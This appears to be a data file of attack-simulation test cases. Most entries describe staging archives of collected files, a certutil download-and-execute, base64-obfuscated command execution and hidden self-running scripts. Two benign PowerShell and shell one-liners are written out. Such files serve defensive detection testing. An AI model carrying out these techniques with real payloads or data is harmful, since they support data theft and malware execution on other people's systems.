attacks.description: Advanced: Uses PowerShell script block to discover and archive specific files, then cleans up source
attacks.expected_behavior: Creates test files, uses PowerShell to find and archive files matching 's*.txt', stores archive in %TEMP%, and attempts to remove the source file (non-destructive to system).

attacks.description: Basic archiving of a single collected file using tar
attacks.expected_behavior: Creates a tar archive named collected_data.tar in the temporary directory containing the specified report file. No compression is applied.

attacks.description: Intermediate: Compress multiple log files into a gzipped tar archive
attacks.expected_behavior: Generates a compressed archive 'collected_logs.tar.gz' in the temp directory containing two specified log files using gzip compression.

attacks.description: Advanced: Recursively archive sensitive directories into a password-protected zip file
attacks.expected_behavior: Creates a password-protected zip archive 'staged_data.zip' in the temp directory containing all files from configs and notes directories. Password is included in command line (visible in history).

attacks.description: Simulates downloading and executing a malicious file using certutil and start command
attacks.expected_behavior: Downloads a file from a URL to %TEMP% using certutil, then attempts to execute it via start. In testing, the URL points to a benign or non-existent resource to avoid actual payload delivery.

attacks.command: powershell -Command "mkdir '%TEMP%\_tmp' -ErrorAction SilentlyContinue; $content = 'This is a test file simulating malware'; Set-Content -Path '%TEMP%\_tmp\launcher.bat' -Value 'echo Running malicious payload... &' -Force; Start-Process '%TEMP%\_tmp\launcher.bat'"
attacks.description: Creates a malicious batch script in temp directory and executes it using PowerShell
attacks.expected_behavior: Creates a temporary directory, writes a benign batch file that prints a message, and executes it. The use of Start-Process simulates user execution of a malicious script.

attacks.description: Simulates execution of a base64-encoded command that runs calc.exe (benign)
attacks.expected_behavior: Decodes a Base64 string (which represents ' calc .') and executes it using Invoke-Expression. This simulates encoded command execution, a common method to deliver malicious payloads, but runs a harmless command.

attacks.description: Basic user execution: Create and execute a local malicious script in a hidden directory.
attacks.expected_behavior: Creates a hidden shell script in the user's cache directory, makes it executable, and runs it. Outputs a simulated payload message.

attacks.command: cd $TMP && echo 'echo \"Malicious payload simulation\"' > .payload.sh && chmod 755 .payload.sh && ./.payload.sh && rm -f .payload.sh
attacks.description: Intermediate: Simulate execution of a malicious file downloaded to temporary directory.
attacks.expected_behavior: Changes to temp directory, creates a hidden script, executes it, and cleans up. Simulates execution of a transient malicious file.

attacks.description: Advanced: Execute a base64-encoded command stream to simulate obfuscated payload execution.
attacks.expected_behavior: Decodes a base64 string containing a benign echo command and executes it via shell. Mimics execution of encoded payloads often seen in real attacks.
